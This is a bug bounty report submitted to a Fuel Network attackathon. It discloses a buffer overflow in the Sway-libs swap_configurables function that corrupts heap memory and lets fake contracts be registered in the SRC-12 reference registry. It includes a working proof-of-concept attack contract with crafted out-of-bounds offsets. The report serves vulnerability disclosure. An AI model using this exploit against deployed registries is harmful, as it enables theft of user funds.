# Attackathon \_ Fuel Network 32812 - \[Smart Contract - Low] Sway-libSRC- Buffer overflow in swap\_confi

## Sway-lib/SRC-12: Buffer overflow in swap\_configurables allows for verifying arbitrary code/config, loss of funds

Submitted on Thu Jul 04 2024 00:13:08 GMT-0400 (Atlantic Standard Time) by @LonelySloth for [Attackathon | Fuel Network](https://immunefi.com/bounty/fuel-network-attackathon/)

Report ID: #32812

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/FuelLabs/sway-libs/tree/0f47d33d6e5da25f782fc117d4be15b7b12d291b>

Impacts:

* Verifying aribtrary code/configuration in registry
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Buffer Overflow leading to arbitrary heap manipulation

### Description

## NOTE: DO NOT ESCALATE UNTIL CHANGES WINDOW IS COMPLETE (2024/7/5?)

### Brief/Intro

The standard SRC-12 defines a way for verifying a certain contract is in fact a version of a giver original bytecode, with certain configurable values set. However, the `swap_configurables` function in the Sway Libs, has a buffer overflow bug that allows for arbitrary writes to the contract heap. Consequently the reference implementation of SRC-12 can be tricked into registering contracts with arbitrary configurations/code combinations. Any contract that relies on SRC-12 can be tricked into trusting arbitrary contracts, leading to loss of funds.

### Vulnerability Details

The function `swap_configurables` in `sway-libs/bytecode` accepts as input a vector containing a bytecode and a vector containing the "configurables", i.e. data that must be overwritten in the original bytecode.

However, the implementation uses raw pointers, **without any check of boundaries of the original bytecode vector**. That means a configuration vector with offsets/lengths in excess of the original bytecode vector will write on **arbitrary memory**.

```
let (offset, data) = configurables.get(configurable_iterator).unwrap();

        // Overwrite the configurable data into the bytecode
        data
            .ptr()
            .copy_bytes_to(bytecode.ptr().add::<u8>(offset), data.len());
```

In particular, all the heap space allocated prior to the allocation of the bytecode vector can be overwritten by that function.

While this is in general a serious issue to can affect any contract using the library, the impact results in direct exploits in the **reference implementation for SRC-12**.

The SRC-12 standard allows for calls to `register_contract` with arbitrary configuration vectors. The vector is then passed directly to the vulnerable `swap_configurables` implementation.

That means a carefully crafted configurations vector can overwrite all heap memory in the SRC-12 contract, leading to registering arbitrary contracts with arbitrary fake configurations. This can be obtained with a configuration vector that has at least two elements:

* First: a complete overwrite of the entire bytecode, with offset 0, and the data being an exact copy the original bytecode template.
* Second: **a complete overwrite of the configuration vector itself**. The offset and pointers for each element can be changed to arbitrary data, including pointing to data in the heap of the calling contract.

*The end result is that regardless of the code in the contract, the verification will work, and the SRC-12 registry will insert the into it's map using as key **the fake key provided by the attacker**.*

Any other contract using the registry to either validate a certain contract, or look up the contract corresponding to a certain set of parameters can be **tricked into trusting contracts with arbitrary malicious code**.

In particular, it's easy to register a contract that has bytecode corresponding to a minimal proxy to any malicious code.

### Impact Details

In general, any contract calling `swap_configurables` can be vulnerable to arbitrary memory corruption, in particular if the configuration vector is at least in part provided by a caller.

**In particular the reference SRC-12 implementation is completely vulnerable to registering arbitrary contracts with arbitrary configuration.**

**Consequently any contract that relies on an SRC-12 registry to verify contracts it can trust is vulnerable to trusting arbitrary malicious contracts.**

A very likely exploit scenario is in a registry for AMM pools (I'm thinking Uniswap Pools equivalent) that is queried for the pool corresponding to a pair of tokens and a given fee.

The attacker is able to register arbitrary malicious contracts as "Pools". This will lead both users and other contracts to send funds to malicious contracts controlled by the attacker.

### Proof of concept

### Proof of Concept

As the Rust SDK seems to panic with ABI's containing vectors, I wrote the auxiliary contract as follows, that performs the attack on the reference SRC-12 implementation:

```
abi TestContract {
    #[storage(read, write)]
    fn do_test(child_contract: ContractId, registry: ContractId);
}

impl TestContract for Contract {
    /*
        child_contract -- the fake contract we will register in the factory
        registry -- the target SRC-12 factory/registry contract

    */
    #[storage(read, write)]
    fn do_test(child_contract: ContractId, registry: ContractId) { 

        let mut length = asm(
            load_target: child_contract,  
            length,
        
        ) {
            csiz length load_target;
            length
        };
        // length of the fake child contract
        log(length);

        let factory = abi(MyRegistryContract, b256::from(registry));

        let mut data : Vec<u8> = Vec::with_capacity(length);       
        let mut i = 0;
        while i<length { data.push(0xff); i+=1; };

        factory.set_bytecode(data);

        let factory = abi(SRC12, b256::from(registry));

        let mut data : Vec<u8> = Vec::with_capacity(length);       
        let mut i = 0;
        while i<length { data.push(0x41); i+=1; }; // ASCII 'A' over and over.
        // our test vector is just a binary with 104 times the letter 'A'.

        let mut v: Vec<(u64, Vec<u8>)> = Vec::new();

        v.push((0, data)); // first entry in the fake configuration. this will
        // overwrite the whole contact to match the bytecode.
        // however, we will change the variable configuration later,
        // forcing the registry to insert into the storage map using a different key.

        let mut data : Vec<u8> = Vec::with_capacity(length);       
        let mut i = 0;
        while i<128 { data.push(0x00); i+=1; }; // zero out a bunch of heap space
        // note that instead we could have put arbitrary values in the
        // two entries of "configuration", by changing their pointers
        // to point to data in the calling contract's (this) heap.
        // however this should be enough to demonstate the impact in a PoC.
        
        // depending on compiler version etc, offset might change.
        let offset = 0x488;
        v.push((data.len() + length + offset, data)); 

        // register into the factory/registry
        assert(factory.register_contract(child_contract, Some(v)).is_ok());

        let factory = abi(SRC12_Extension, b256::from(registry));

        let mut fakevec: Vec<(u64, Vec<u8>)> = Vec::new();
        fakevec.push((0, Vec::new()));
        fakevec.push((0, Vec::new()));
        
        let c = factory.get_contract_id(Some(fakevec)).unwrap();
        assert(c == child_contract);
    }    
}

```

I used as the "malicious contract" a file containing 104 times the letter "A" in ASCII (`0x41`).

The bytecode template used is a vector containing 104 times the byte `0xff`.

In the example, the registry accepts the malicious contract as corresponding to the "fake configuration" `[(0, []), (0, [])]`.

Other arbitrary configurations can be used, but I believe this already proves the point.
